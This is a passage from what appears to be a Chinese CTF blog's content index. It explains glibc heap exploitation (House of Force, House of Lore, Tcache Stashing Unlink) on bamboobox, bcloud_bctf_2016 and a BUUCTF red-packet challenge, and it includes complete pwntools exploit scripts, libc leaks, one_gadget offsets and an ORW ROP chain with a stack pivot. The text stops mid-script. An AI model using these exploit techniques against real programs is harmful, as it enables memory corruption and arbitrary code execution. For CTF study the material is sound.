#struct_content_ptr\n0x6020e0 &lt;itemlist+32&gt;:\t0x0000000000000000\t0x0000000000000000\n0x6020f0 &lt;itemlist+48&gt;:\t0x0000000000000000\t0x0000000000000000\n0x602100 &lt;itemlist+64&gt;:\t0x0000000000000000\t0x0000000000000000\npwndbg&gt; \n//注意struct_content_ptr指向malloc出来malloc_data的地址\n\n攻击原理及exp#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\ncontext.log_level = 'debug'\np = process('./bamboobox')\n\ndef cmd(choice):\n  p.sendlineafter('',str(choice))\n  \ndef create(size,content):\n  cmd(2)\n  p.sendlineafter('item name:',str(size))\n  p.sendlineafter('item:',content)\n\ndef edit(index,size,content):\n  cmd(3)\n  p.sendlineafter('of item:',str(index))\n  p.sendlineafter('item name:',str(size))\n  p.sendlineafter('the item:',content)\n\ndef delete(index):\n  cmd(4)\n  p.sendlineafter('of item:',str(index))\n\ndef quit():\n  cmd(5)\n\nmagic = 0x400d49\ncreate(0x30, \"aaaa\")\ncontent='a'*0x30+'1'*8+p64(0xffffffffffffffff)\nedit(0,0x40,content)\noffset=-0x60-0x10\ncreate(offset,'bbbb')\ncreate(0x10,p64(magic)*2)\nquit()\np.interactive()\n\n","tags":["House of 系列"]},{"title":"House of Force2","url":"/2023/04/10/House%20of%20Force2/","content":"House Of Force2基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。\n如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。\n然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。\nglibc源码：// 获取当前的top chunk，并计算其对应的大小\nvictim = av-&gt;top;\nsize   = chunksize(victim);\n// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。\nif ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) \n{\n    remainder_size = size - nb;\n    remainder      = chunk_at_offset(victim, nb);\n    av-&gt;top        = remainder;\n    set_head(victim, nb | PREV_INUSE |\n            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));\n    set_head(remainder, remainder_size | PREV_INUSE);\n\n    check_malloced_chunk(av, victim, nb);\n    void *p = chunk2mem(victim);\n    alloc_perturb(p, bytes);\n    return p;\n}\n\n例题bcloud_bctf_2016\n程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk\nadd函数int add()\n{\n  int result; // eax\n  int i; // [esp+18h] [ebp-10h]\n  int v2; // [esp+1Ch] [ebp-Ch]\n\n  for ( i = 0; i &lt;= 9 &amp;&amp; heap_array[i]; ++i )\n    ;\n  if ( i == 10 )\n    return puts(\"Lack of space. Upgrade your account with just $100 :)\");\n  puts(\"Input the length of the note content:\");\n  v2 = choose();\n  heap_array[i] = malloc(v2 + 4);\n  if ( !heap_array[i] )\n    exit(-1);\n  dword_804B0A0[i] = v2;\n  puts(\"Input the content:\");\n  readd(heap_array[i], v2, 10);\n  printf(\"Create success, the id is %d\\n\", i);\n  result = i;\n  dword_804B0E0[i] = 0;\n  return result;\n}\n\nadd函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写\nedit函数int edit()\n{\n  unsigned int v1; // [esp+14h] [ebp-14h]\n  int v2; // [esp+18h] [ebp-10h]\n  int v3; // [esp+1Ch] [ebp-Ch]\n\n  puts(\"Input the id:\");\n  v1 = choose();\n  if ( v1 &gt;= 0xA )\n    return puts(\"Invalid ID.\");\n  v2 = heap_array[v1];\n  if ( !v2 )\n    return puts(\"Note has been deleted.\");\n  v3 = dword_804B0A0[v1];\n  dword_804B0E0[v1] = 0;\n  puts(\"Input the new content:\");\n  readd(v2, v3, 10);\n  return puts(\"Edit success.\");\n}\n\ndelete函数int delete()\n{\n  unsigned int v1; // [esp+18h] [ebp-10h]\n  void *index; // [esp+1Ch] [ebp-Ch]\n  puts(\"Input the id:\");\n  v1 = choose();\n  if ( v1 &gt;= 0xA )\n    return puts(\"Invalid ID.\");\n  index = heap_array[v1];\n  if ( !index )\n    return puts(\"Note has been deleted.\");\n  heap_array[v1] = 0;\n  dword_804B0A0[v1] = 0;\n  free(index);  #UAF\n  return puts(\"Delete success.\");\n}\n\ndelete函数在释放chunk时存在UAF漏洞\n自定义一个read函数int __cdecl readd(int a1, int a2, char a3)\n{\n  char buf; // [esp+1Bh] [ebp-Dh] BYREF\n  int i; // [esp+1Ch] [ebp-Ch]\n\n  for ( i = 0; i &lt; a2; ++i )\n  {\n    if ( read(0, &amp;buf, 1u) &lt;= 0 )\n      exit(-1);\n    if ( buf == a3 )\n      break;\n    *(a1 + i) = buf;\n  }\n  *(i + a1) = 0;\n  return i;\n}\n\n三个参数，a1为要输入的地址，a2为输入大小，a3为截止符\n先把前面的一些东西写好from pwn import *\nfrom LibcSearcher import *\ncontext(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug\n#定义gdb调试函数\ndef dbg():\n        gdb.attach(sh)\n        pause()\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\nsh = process('./bcloud_bctf_2016')\n#sh = remote('node4.buuoj.cn',26937)\nelf = ELF('./bcloud_bctf_2016')\ndef add(size,content):\n   sla('&gt;&gt;','1')\n   sla('note content:',str(size))\n   sa('content:',content)\n \ndef edit(index,content):\n   sla('&gt;&gt;','3')\n   sla('id:',str(index))\n   sa('content:',content)\n \ndef delete(index):\n   sla('&gt;&gt;','4')\n   sla('id:',str(index))\n\n分析：程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞strcpy复制结束的标志是’\\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来\nsa('name:','a'*64)\nru('a'*64)\nheap_addr = u32(r(4)) - 0x8\nlg('heap_addr',heap_addr)\ndbg()\n\n\n再看另一个函数\n栈布局-0000005C v2 dd ?\n-00000058 db ? ; undefined\n-00000057 db ? ; undefined\n..........\n-00000016 db ? ; undefined\n-00000015 db ? ; undefined\n-00000014 v4 dd ?\n-00000010 db ? ; undefined\n-0000000F db ? ; undefined\n-0000000E db ? ; undefined\n-0000000D db ? ; undefined\n\n这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\\x00’，如果我们将s填满（b’b’*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b’b’*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）\nsa('Org:','a'*0x40)\nsla('Host:',p32(0xFFFFFFFF))\ntop_chunk_addr = heap_addr  + 0x48*3 - 0x8\nlg('top_chunk_addr',(top_chunk_addr))\n\n\n之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，\noffset = heap_array - （top_chunk_addr +0x8）- 0x8\n\n\nheap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，\nadd(offset,'\\n')\t\nadd(0x18,'\\n')\n\n之后编辑chunk_1来修改heap_array数组\nputs_plt = elf.plt['puts']\n__libc_start_main_got = elf.got['__libc_start_main']\nfree_got = elf.got['free']\nedit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10) + b'\\x00'*0x8)\n\n此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）\nedit(1,p32(puts_plt) + b'\\n')\n\n此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址\ndelete(2)\ndbg()\n\nfree（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址\n#本地\none_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]\nlibc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')\n#buu远程\n#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]\n#libc = ELF('../../libc-2.23.so--32')\nlibc_base = __libc_start_main_addr - libc.sym['__libc_start_main']\nonegadget = one_gadget[3] + libc_base\n\n再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve(“/bin/sh\\x00”)，获得shell。\n    delete(1)\n    itr()\n\n\nexpfrom pwn import *\nfrom LibcSearcher import *\ncontext(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug\n#定义gdb调试函数\ndef dbg():\n        gdb.attach(sh)\n        pause()\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\n\nsh = process('./bcloud_bctf_2016')\n#sh = remote('node4.buuoj.cn',26937)\n\nelf = ELF('./bcloud_bctf_2016')\nputs_plt = elf.plt['puts']\n__libc_start_main_got = elf.got['__libc_start_main']\nfree_got = elf.got['free']\nheap_array = 0x0804B120\n \ndef add(size,content):\n   sla('&gt;&gt;','1')\n   sla('note content:',str(size))\n   sa('content:',content)\n \ndef edit(index,content):\n   sla('&gt;&gt;','3')\n   sla('id:',str(index))\n   sa('content:',content)\n \ndef delete(index):\n   sla('&gt;&gt;','4')\n   sla('id:',str(index))\ndef main():\n    sa('name:','a'*64)\n    ru('a'*64)\n    heap_addr = u32(r(4)) \n    lg('heap_addr',heap_addr)\n    #dbg()\n    sa('Org:','a'*0x40)\n    #修改top chunk的size为-1（0xFFFFFFFF）\n    sla('Host:',p32(0xFFFFFFFF))\n    top_chunk_addr = heap_addr + 0x48*3-0x8\n    lg('top_chunk_addr',(top_chunk_addr))\n    offset = heap_array - (top_chunk_addr +0x8)- 0x8\n    lg('offset',offset)\n    add(offset,'') #0\n    add(0x18,'\\n') #1\n    edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10)  + b'\\x00'*8)\n    edit(1,p32(puts_plt) + b'\\n')\n    #泄露__libc_start_main_got的地址\n    delete(2)\n    r(1)\n    __libc_start_main_addr = u32(r(4))\n    lg('__libc_start_main',__libc_start_main_addr)\n    #dbg()\n    '''\n    libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)\n    libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')\n    system_addr = libc_base + libc.dump('system')\n    lg('libc_base',(libc_base))\n    lg('system_addr',(system_addr))\n    edit(1,p32(system_addr) + b'\\n')\n    '''\n    #本地\n    one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]\n    libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')\n    #buu远程\n    #one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]\n    #libc = ELF('../../libc-2.23.so--32')\n    libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']\n    onegadget = one_gadget[3] + libc_base\n    edit(1,p32(onegadget) + b'\\n')\n    #getshell\n    delete(1)\n    itr()\nmain()\n\n","tags":["House of 系列"]},{"title":"House of Lore","url":"/2023/04/10/House%20of%20Lore/","content":"如果从fastbins中malloc-一个freechunk时，glibc会做以下两个检测：\nTcache Stashing Unlink Attack利用了House of Lore的一些手段，两者都是利用了small bin\nHouse of Lore\nHouse of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。\n\nTcache Stashing Unlink Attack\n利用特性：1.tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中2.calloc函数分配堆块时不从tcache bin中选取。3.修改一个small bin的bk指针时，就可以实现在任意地址上写一个libc地址，构造得当可以往任意地址申请chunk，实现任意地址写\n\n利用前提\n1.能控制 Small Bin Chunk 的 bk 指针。\n\n2.程序可以越过Tache取Chunk。(使用calloc即可做到)\n\n3.程序至少可以分配两种不同大小且大小为unsorted bin的Chunk。\n\n例题 BUUCTF-[2020 新春红包题]3未开启canary保护，可能存在栈溢出\nmain函数程序实现四个功能，增，删，查，改，还有一个栈溢出的函数\nvoid __fastcall __noreturn main(char *a1, char **a2, char **a3)\n{\n  char v3[268]; // [rsp+0h] [rbp-110h] BYREF\n  int v4; // [rsp+10Ch] [rbp-4h]\n\n  v4 = 0;\n  sub_11D5();\n  sub_1450();\n  sub_1269();\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        menu();\n        v4 = readd();\n        if ( v4 != 3 )\n          break;\n        a1 = v3;\n        edit(v3, a2);\n      }\n      if ( v4 &gt; 3 )\n        break;\n      if ( v4 == 1 )\n      {\n        if ( x1c &lt;= 0 )\n          exitt();\n        a1 = v3;\n        add(v3);\n        --x1c;\n      }\n      else\n      {\n        if ( v4 != 2 )\n          goto LABEL_19;\n        a1 = v3;\n        delete(v3);\n      }\n    }\n    if ( v4 == 5 )\n      exitt();\n    if ( v4 &lt; 5 )\n    {\n      a1 = v3;\n      show(v3);\n    }\n    else\n    {\n      if ( v4 != 666 )\nLABEL_19:\n        exitt();\n      stack_attack(a1, a2);\n    }\n  }\n}\n\nadd函数申请chunk，会指定chunk的序号，最大为16，且只能申请四种chunk，1.0x10 2.0xf0 3.0x300 4.0x400，并且是calloc函数分配堆块，chunk不会从tcache bin中取。\nint __fastcall sub_1515(__int64 a1)\n{\n  int v2; // [rsp+10h] [rbp-20h]\n  int v3; // [rsp+14h] [rbp-1Ch]\n  unsigned int v4; // [rsp+18h] [rbp-18h]\n  int size; // [rsp+1Ch] [rbp-14h]\n\n  printf(\"Please input the red packet idx: \");\n  v4 = readd();\n  if ( v4 &gt; 0x10 )\n    exitt();\n  printf(\"How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): \");\n  v3 = readd();\n  if ( v3 == 2 )\n  {\n    size = 0xF0;\n  }\n  else if ( v3 &gt; 2 )\n  {\n    if ( v3 == 3 )\n    {\n      size = 0x300;\n    }\n    else\n    {\n      if ( v3 != 4 )\n        goto LABEL_14;\n      size = 0x400;\n    }\n  }\n  else\n  {\n    if ( v3 != 1 )\n    {\nLABEL_14:\n      size = 0;\n      goto LABEL_15;\n    }\n    size = 16;\n  }\nLABEL_15:\n  if ( size != 0x10 &amp;&amp; size != 0xF0 &amp;&amp; size != 0x300 &amp;&amp; size != 0x400 )\n    exitt();\n  *(16LL * v4 + a1) = calloc(1uLL, size);\n  *(a1 + 16LL * v4 + 8) = size;\n  printf(\"Please input content: \");\n  v2 = read(0, *(16LL * v4 + a1), *(16LL * v4 + a1 + 8));\n  if ( v2 &lt;= 0 )\n    exitt();\n  *(v2 - 1LL + *(16LL * v4 + a1)) = 0;\n  return puts(\"Done!\");\n}\n\ndelete函数存在UAF\nint __fastcall delete(__int64 a1)\n{\n  unsigned int v2; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"Please input the red packet idx: \");\n  v2 = readd();\n  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )\n    exitt();\n  free(*(16LL * v2 + a1));                      // uaf\n                                                // \n  return puts(\"Done!\");\n}\n\nedit函数编辑的次数受qword_4010控制，qword_4010为1，只能编辑1次\nint __fastcall sub_1740(__int64 a1, __int64 a2)\n{\n  void *v2; // rsi\n  int v4; // [rsp+18h] [rbp-8h]\n  unsigned int v5; // [rsp+1Ch] [rbp-4h]\n\n  if ( qword_4010 &lt;= 0 )\n    exitt(a1, a2);\n  --qword_4010;\n  printf(\"Please input the red packet idx: \");\n  v5 = readd();\n  if ( v5 &gt; 0x10 || !*(16LL * v5 + a1) )\n    exitt(\"Please input the red packet idx: \", a2);\n  printf(\"Please input content: \");\n  v2 = *(16LL * v5 + a1);\n  v4 = read(0, v2, *(16LL * v5 + a1 + 8));\n  if ( v4 &lt;= 0 )\n    exitt(0LL, v2);\n  *(v4 - 1LL + *(16LL * v5 + a1)) = 0;\n  return puts(\"Done!\");\n}\n\n\nshow函数int __fastcall sub_184E(__int64 a1)\n{\n  unsigned int v2; // [rsp+1Ch] [rbp-4h]\n\n  printf(\"Please input the red packet idx: \");\n  v2 = readd();\n  if ( v2 &gt; 0x10 || !*(16LL * v2 + a1) )\n    exitt();\n  puts(*(16LL * v2 + a1));\n  return puts(\"Done!\");\n}\n\n栈溢出函数执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。\nssize_t sub_13BD()\n{\n  char buf[128]; // [rsp+0h] [rbp-80h] BYREF\n\n  if ( *(first_chunk + 2048) &lt;= 0x7F0000000000LL || *(first_chunk + 2040) || *(first_chunk + 2056) )\n    exitt();\n  puts(\"You get red packet!\");\n  printf(\"What do you want to say?\");\n  return read(0, buf, 0x90uLL);\n}\n\n思路因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。\n调试过程先把前面的写好\n# coding=utf-8\nfrom pwn import *\ncontext(endian='little',os='linux',arch='amd64',log_level='debug') \n\nsh = process('./RedPacket_SoEasyPwn1')\n#sh = remote('node4.buuoj.cn','27283')\n\nlibc=ELF(\"./libc-2.29.so\")\n\n \n \n\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims\t\t    :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\ndef dbg():\n        gdb.attach(sh)\n        pause()\n \n\ndef add(index,chunk_size_index,value):\n    ru('Your input: ')\n    sl('1')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')\n    sl(str(chunk_size_index))\n    ru('Please input content: ')\n    sl(value)\n\ndef free(index):\n    ru('Your input: ')\n    sl('2')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n\ndef edit(index,value):\n    ru('Your input: ')\n    sl('3')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n    ru('Please input content: ')\n    sl(value)\n\ndef show(index):\n    ru('Your input: ')\n    sl('4')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n\n构造tcache bin首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个\n#1.0x10 2.0xf0 3.0x300 4.0x400\nfor i in range(7):\n    add(15,4,'Chunk_15')\n    free(15)\n\nfor i in range(6):\n    add(14,2,'Chunk_14')\n    free(14)\n\ndbg()\n\n此时我们利用UAF可以泄露出heap地址\nshow(15)\nlast_chunk_addr = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00'))\nlg('last_chunk_addr',last_chunk_addr)\nheap_addr = last_chunk_addr - 0x26C0\nlg('heap_addr',heap_addr)\ndbg()\n\n\n利用unsorted bin构造两个small bin chunk\n当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。\n\n我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。\n申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。\nadd(1,4,'Chunk_1')\nadd(13,3,'Chunk_13')\n\ndbg()\n\n我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址\nfree(1)\nshow(1)\nlibc_base = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00')) - 0x1E4CA0\nlg('libc_base',libc_base)\ndbg()\n\n申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100\nadd(13,3,'Chunk_13')\ndbg()\n\n\n在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk\nadd(13,3,'Chunk_13')\n\ndbg()\n\n利用同样方法再构造一个small bin chunk\nadd(2,4,'Chunk_2')\nadd(13,4,'Chunk_13')\n\n#dbg()\n\nfree(2)\n\n#dbg()\n\nadd(13,3,'Chunk_13')\nadd(13,3,'Chunk_13')\n\ndbg()\n\n\n并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0\n修改small bin chunk的bk指针为first_chunk+0x800payload='\\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)\nedit(2,payload)\ndbg()\n\n再次申请0x100大小的chunk，程序仅会检查Chunk2的fd指针是否指向Chunk1，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.\n\n构造ORW的ROP链放入堆块中先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40\npop_rdi_ret = libc_base + 0x0000000000026542\npop_rsi_ret = libc_base + 0x0000000000026f9e\npop_rdx_ret = libc_base + 0x000000000012bda6\nfile_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置\nflag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容\nROP_chain  = '/flag\\x00\\x00\\x00'\n\nopen(file_name_addr,0)\nROP_chain += p64(pop_rdi_ret)\nROP_chain += p64(file_name_addr)\nROP_chain += p64(pop_rsi_ret)\nROP_chain += p64(0)\nROP_chain += p64(libc_base+libc.symbols['open'])\n\nread(3,flag_addr,0x40)Read函数的第一个参数文件描述符从0开始累加，程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，这样在程序中，每打开一个文件，文件描述符值从3开始累加。我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件read函数第一个参数是3，就是在这个文件里读取数据。\nROP_chain += p64(pop_rdi_ret)\nROP_chain += p64(3)\nROP_chain += p64(pop_rsi_ret)\nROP_chain += p64(flag_addr)\nROP_chain += p64(pop_rdx_ret)\nROP_chain += p64(0x40)\nROP_chain += p64(libc_base+libc.symbols['read'])\n\nwrite(1,flag_addr,0x40)\nROP_chain += p64(pop_rdi_ret)\nROP_chain += p64(1)\nROP_chain += p64(pop_rsi_ret)\nROP_chain += p64(flag_addr)\nROP_chain += p64(pop_rdx_ret)\nROP_chain += p64(0x40)\nROP_chain += p64(libc_base+libc.symbols['write'])\n\n申请chunk，将ROP链写到chunk里\nadd(4,4,ROP_chain)\n\ndbg()\n\n\n栈迁移利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。\nleave_ret = libc_base + 0x0000000000058373\nru('Your input: ')\nsl('666')\nru('What do you want to say?')\n#栈迁移\nsl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))\n\nitr()\n\nexp# coding=utf-8\nfrom pwn import *\ncontext(endian='little',os='linux',arch='amd64',log_level='debug') \n\nsh = process('./RedPacket_SoEasyPwn1')\n#sh = remote('node4.buuoj.cn','27283')\n\nlibc=ELF(\"./libc-2.29.so\")\n\n \n \n\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims\t\t    :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg      = lambda address,data       :log.success('%s: '%(address)+hex(data))\ndef dbg():\n        gdb.attach(sh)\n        pause()\n \n\ndef add(index,chunk_size_index,value):\n    ru('Your input: ')\n    sl('1')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n    ru('How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ')\n    sl(str(chunk_size_index))\n    ru('Please input content: ')\n    sl(value)\n\ndef free(index):\n    ru('Your input: ')\n    sl('2')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n\ndef edit(index,value):\n    ru('Your input: ')\n    sl('3')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n    ru('Please input content: ')\n    sl(value)\n\ndef show(index):\n    ru('Your input: ')\n    sl('4')\n    ru('Please input the red packet idx: ')\n    sl(str(index))\n\n\n \n\n#1.0x10 2.0xf0 3.0x300 4.0x400\nfor i in range(7):\n    add(15,4,'Chunk_15')\n    free(15)\n\n\n\nfor i in range(6):\n    add(14,2,'Chunk_14')\n    free(14)\n\n#dbg()\n\nshow(15)\nlast_chunk_addr = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00'))\nlg('last_chunk_addr',last_chunk_addr)\nheap_addr = last_chunk_addr - 0x26C0\nlg('heap_addr',heap_addr)\n\n#dbg()\n\nadd(1,4,'Chunk_1')\nadd(13,3,'Chunk_13')\n\n#dbg()\n\nfree(1)\nshow(1)\nlibc_base = u64(ru('\\x0A').strip('\\x0A').ljust(8,'\\x00')) - 0x1E4CA0\nlg('libc_base',libc_base)\n\n\n#dbg()\n\n#在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100\nadd(13,3,'Chunk_13')\n\n\n#dbg()\n\n#在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top 